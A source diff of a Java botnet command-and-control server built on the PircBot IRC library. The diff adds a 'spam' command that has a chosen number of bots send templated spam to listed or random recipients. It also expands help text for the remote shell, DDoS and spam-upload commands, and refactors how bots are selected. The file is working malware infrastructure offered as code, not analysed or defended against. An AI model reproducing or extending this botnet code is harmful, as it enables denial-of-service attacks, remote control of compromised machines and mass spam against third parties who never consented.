@@ -25,13 +25,19 @@ import org.jibble.pircbot.*;
  * 				Usage: ddos url interval duration bot [more bots]
  * 			</dd>
  * 		<dt>Spam File Upload</dt>
- * 			<dd> One can upload a template and email file with this command for later use in sending spam. You can specify specific bots to send the files 
- * 				to or you can give 'all' to send the file to all available bots. The template file must contain unique 'XXX', 
+ * 			<dd> One can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names "template.txt" or "emails.txt".
+ * 				 You can specify specific bots to send the files to or you can give 'all' to send the file to all available bots. 
+ * 				The template file must contain unique 'XXX', 
  * 				'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line. <br/>
  * 				Usage: spamupload templateFile emailFile bot [more bots]
  * 			</dd>
- * 		<dt>Lease</dt>
- * 			<dd>
+ * 		<dt>Spam</dt>
+ * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
+ * 				The spam will be sent from the given address to the given recipients.
+ * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
+ * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
+ * 				the number will not be respected if it exceeds the size of the botnet.
+ * 				Usage: spam numBots xxx yyy zzz from subject recipient [more recipients]
  * 			</dd>
  * </dl>
  * 
@@ -67,7 +73,6 @@ public class BotnetServer extends PircBot {
 			
 			connect(SERVER, PORT);
 			
-			setMode(CHANNEL, "s");
 			input = new Scanner(System.in);
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
@@ -78,6 +83,7 @@ public class BotnetServer extends PircBot {
 	
 	protected void onConnect() {
 		joinChannel(CHANNEL);
+		setMode(CHANNEL, "s");
 	}
 	
 	protected void onUserList(String channel, User[] bots) {
@@ -157,12 +163,7 @@ public class BotnetServer extends PircBot {
 			if (parts.length < 5) {
 				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
 			} else {
-				String[] botNames;
-				if (parts[4].equalsIgnoreCase("all")) {
-					botNames = getUserNames();
-				} else {
-					botNames = Arrays.copyOfRange(parts, 4, parts.length);
-				}
+				String[] botNames = chooseBots(parts, 4);
 				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
 				for (int i = 0; i < botNames.length; i++) {
 					if (!botNames[i].equals(NAME)) {
@@ -176,17 +177,31 @@ public class BotnetServer extends PircBot {
 			if (parts.length < 4) {
 				System.out.println("Usage: spamupload template emails bot [more bots]");
 			} else {
-				String[] botNames;
-				if (parts[3].equalsIgnoreCase("all")) {
-					botNames = getUserNames();
-				} else {
-					botNames = Arrays.copyOfRange(parts, 3, parts.length);
-				}
+				String[] botNames = chooseBots(parts, 3);
 				for (int i = 0; i < botNames.length; i++) {
 					if (!botNames[i].equals(NAME)) {
 						dccSendFile(new File(parts[1]), botNames[i], TIMEOUT);
 						dccSendFile(new File(parts[2]), botNames[i], TIMEOUT);
 					}
+				}
+			}
+		//Respond to spam command by selecting numbots bots and issuing the command	
+		} else if (s.toLowerCase().startsWith("spam")) {
+			String[] parts = s.split(" ");
+			if (parts.length < 8) {
+				System.out.println("Usage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
+			} else {
+				int numBots = Integer.parseInt(parts[1]);
+				String[] bots = getUserNames();
+				if (bots.length > numBots) {
+					bots = Arrays.copyOfRange(bots, 0, numBots);
+				}
+				String command = parts[0];
+				for (int i = 2; i < parts.length; i++) {
+					command += parts[i];
+				}
+				for (int i = 0; i < bots.length; i++) {
+					sendMessage(bots[i], command);
 				}
 			}
 		//Respond to a message beginning with a colon by messaging the CHANNEL
@@ -195,6 +210,14 @@ public class BotnetServer extends PircBot {
 		//Respond to all other messages by sending the message raw to the IRC server
 		} else if (!s.isEmpty()) {
 			sendRawLine(s);
+		}
+	}
+	
+	public String[] chooseBots(String[] arr, int index) {
+		if (arr[index].equalsIgnoreCase("all")) {
+			return getUserNames();
+		} else {
+			return Arrays.copyOfRange(arr, index, arr.length);
 		}
 	}
 	
@@ -226,18 +249,31 @@ public class BotnetServer extends PircBot {
 	 * Prints out a help message that describes available functionality and commands.
 	 */
 	private void printHelp() {
-		System.out.println("\tBotnet:");
-		System.out.println("\t\tList");
-		System.out.println("\t\t\tlists the available channels on this server");
-		System.out.println("\t\tNames");
-		System.out.println("\t\t\tlists the bots currently on this channel");
-		System.out.println("\t\tShell usernick [timeout]");
-		System.out.println("\t\t\topens a remote shell with the machine hosting the user");
-		System.out.println("\t\t\twith the given nick (type \"exit\" to exit shell)");
-		System.out.println("\t\t\tif you need to type \"exit\" without leaving the shell add a space at the end");
-		System.out.println("\t\tDDOS url interval duration bot [more bots]");
-		System.out.println("\t\t\trequests the given url every 'interval' seconds for");
-		System.out.println("\t\t\t'duration' seconds from each of the given bots (pass 'all' to use all bots)");
+		System.out.println("\tHelp");
+		System.out.println("\t\tPrints out the available commands");
+		System.out.println("\t\tUsage: help");
+		System.out.println("\tNames");
+		System.out.println("\t\tPrints out the nicks of all bots running on the IRC server");
+		System.out.println("\t\tUsage: names");
+		System.out.println("\tRemote shell");
+		System.out.println("\t\tOne must give the command \"exit\" to leave the shell again, if you must type \"exit\" but don't wish to leave simply append a space");
+		System.out.println("\t\tUsage: shell botNick [timeout]");
+		System.out.println("\tDistributed Denial of Service");
+		System.out.println("\t\tOne can specify by nick and number of bots to have participate or simply say \"all\" for the first bot nick to have all bots participate");
+		System.out.println("\t\tddos url interval duration bot [more bots]");
+		System.out.println("\tSpam File Upload");
+		System.out.println("\t\tOne can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names \"template.txt\" or \"emails.txt\".");
+		System.out.println("\t\tYou can specify specific bots to send the files to or you can give 'all' to send the file to all available bots.");
+		System.out.println("\t\tThe template file must contain unique 'XXX', ");
+		System.out.println("\t\t'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line.");
+		System.out.println("\t\tUsage: spamupload templateFile emailFile bot [more bots]");
+		System.out.println("\tSpam");
+		System.out.println("\t\tOne can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word."); 
+		System.out.println("\t\tThe spam will be sent from the given address to the given recipients.");
+		System.out.println("\t\tGiving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to");
+		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
+		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
+		System.out.println("\t\tUsage: spam numBots xxx yyy zzz from subject recipient [more recipients]");
 	}
 	
 	/**
